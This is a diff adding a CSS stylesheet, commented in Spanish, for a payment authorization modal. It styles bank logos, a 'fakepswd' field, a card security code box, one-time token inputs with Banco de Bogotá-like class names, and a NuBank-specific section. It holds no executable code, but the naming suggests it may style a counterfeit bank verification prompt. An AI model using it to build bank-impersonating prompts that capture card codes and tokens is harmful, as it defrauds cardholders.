@@ -1,0 +1,273 @@
+/* Estilos base del modal */
+.modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.6);
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 1050;
+}
+
+.modal-dialog {
+    max-width: 460px;
+    width: 90%;
+    margin: 10px;
+}
+
+.modal-content {
+    background-color: #ffffff;
+    border-radius: 4px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    overflow: hidden;
+}
+
+/* Header del modal */
+.modal-header {
+    padding: 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid #eee;
+}
+
+.modal-img {
+    height: 30px;
+    width: auto;
+    object-fit: contain;
+}
+
+/* Cuerpo del modal */
+.modal-body {
+    padding: 15px;
+}
+
+.modal-body h5 {
+    font-size: 14px;
+    margin-bottom: 10px;
+    font-weight: 600;
+    color: #333;
+}
+
+.modal-body h6 {
+    font-size: 13px;
+    margin-bottom: 10px;
+    font-weight: 600;
+    color: #333;
+}
+
+.modal-body small {
+    font-size: 12px;
+    color: #666;
+    display: block;
+    margin-bottom: 15px;
+}
+
+/* Tabla de detalles */
+table {
+    width: 100%;
+    font-size: 13px;
+    margin-bottom: 15px;
+}
+
+.titleT {
+    padding: 8px 10px 8px 0;
+    color: #666;
+    width: 140px;
+    font-weight: normal;
+}
+
+/* Estilos de formularios */
+.form-control {
+    height: 32px;
+    padding: 6px 10px;
+    font-size: 13px;
+    border: 1px solid #ddd;
+    border-radius: 3px;
+    background-color: #fff;
+    width: 100%;
+}
+
+.form-control:focus {
+    border-color: #999;
+    box-shadow: none;
+    outline: none;
+}
+
+.fakepswd {
+    font-family: monospace;
+}
+
+/* Contenedor de código de seguridad */
+.c_csc {
+    text-align: center;
+    margin: 15px 0;
+}
+
+.c_csc label {
+    font-size: 13px;
+    margin-bottom: 8px;
+    display: block;
+    font-weight: 600;
+}
+
+.c_csc .form-control {
+    max-width: 150px;
+    margin: 0 auto;
+    text-align: center;
+    height: 40px;
+    font-size: 16px;
+}
+
+/* Footer y botón */
+.modal-footer {
+    padding: 15px;
+    text-align: center;
+    border-top: none;
+}
+
+button.authorize {
+    background-color: #333;
+    color: #fff;
+    border: none;
+    padding: 8px 30px;
+    font-size: 13px;
+    border-radius: 3px;
+    cursor: pointer;
+    display: block;
+    margin: 0 auto;
+    min-width: 120px;
+}
+
+button.authorize:hover {
+    background-color: #444;
+}
+
+button.authorize:disabled {
+    background-color: #999;
+    cursor: not-allowed;
+}
+
+/* Mensajes de error */
+.div_error {
+    margin: 10px 0;
+    padding: 8px;
+    background-color: #fff2f2;
+    border: 1px solid #ffcdd2;
+    border-radius: 3px;
+    font-size: 12px;
+    color: #d32f2f;
+}
+
+/* Loader */
+#loading_now {
+    text-align: center;
+    padding: 15px 0;
+}
+
+#loading_now img {
+    width: 30px;
+}
+
+/* Estilos para los inputs de token */
+.bdb-ml-bm-token {
+    margin-top: 15px;
+    padding: 15px;
+    background-color: #fff;
+}
+
+.bdb-ml-bm-token__title {
+    margin-bottom: 10px;
+}
+
+.bdb-ml-bm-token__title small {
+    font-size: 12px;
+    color: #666;
+}
+
+.bdb-at-input-token__pass-code-area {
+    display: flex;
+    gap: 6px;
+    justify-content: center;
+    margin-top: 15px;
+}
+
+.bdb-at-input-token__pass-code-area__box {
+    width: 35px;
+    height: 35px;
+    text-align: center;
+    font-size: 14px;
+    border: 1px solid #ddd;
+    border-radius: 3px;
+    padding: 0;
+}
+
+.bdb-at-input-token__pass-code-area__box:focus {
+    border-color: #999;
+    outline: none;
+}
+
+/* Estilos específicos para NuBank */
+#modalNU .modal-body {
+    padding: 15px;
+}
+
+#modalNU .header_left img,
+#modalNU .header_right img {
+    height: 25px;
+    width: auto;
+}
+
+/* Media queries */
+@media (max-width: 480px) {
+    .modal-dialog {
+        margin: 5px;
+        width: 95%;
+    }
+
+    .titleT {
+        width: 120px;
+    }
+
+    .form-control {
+        font-size: 12px;
+    }
+
+    .modal-body h5,
+    .modal-body h6 {
+        font-size: 13px;
+    }
+
+    .modal-body small {
+        font-size: 11px;
+    }
+    
+    .bdb-at-input-token__pass-code-area__box {
+        width: 32px;
+        height: 32px;
+        font-size: 13px;
+    }
+}
+
+/* Utilidades */
+.text-center {
+    text-align: center;
+}
+
+.noDisplay {
+    display: none;
+}
+
+[ng-cloak] {
+    display: none;
+}
+
+.fixedAll {
+    padding-right: 16.7999px;
+     overflow: hidden;
+}
